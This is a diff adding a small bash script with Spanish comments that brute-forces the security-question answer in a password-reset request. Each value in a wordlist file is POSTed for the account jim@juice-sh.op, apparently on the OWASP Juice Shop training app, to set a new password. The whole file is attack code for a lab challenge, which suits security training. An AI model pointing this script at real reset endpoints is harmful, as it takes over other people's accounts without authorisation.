@@ -1,0 +1,29 @@
+#!/bin/bash
+
+if [ "$#" -ne 2 ]; then
+  echo "Uso: $0 <URL> <archivo>"
+  exit 1
+fi
+
+URL="$1"
+ARCHIVO="$2"
+
+if [ ! -f "$ARCHIVO" ]; then
+  echo "Error: El archivo '$ARCHIVO' no existe."
+  exit 1
+fi
+
+contador=0
+
+while IFS= read -r linea; do
+  # Saltar líneas vacías
+  if [ -z "$linea" ]; then
+    continue
+  fi
+  contador=$((contador + 1))
+  # Construir el JSON con el valor inyectado
+  payload=$(printf '{"email":"jim@juice-sh.op","answer":"%s","new":"34erdfCV.","repeat":"34erdfCV."}' "$linea")
+  # Enviar la petición POST
+  codigo_http=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d "$payload" "$URL")
+  echo "Inyección $contador: Valor '$linea' -> Código HTTP $codigo_http"
+done < "$ARCHIVO"
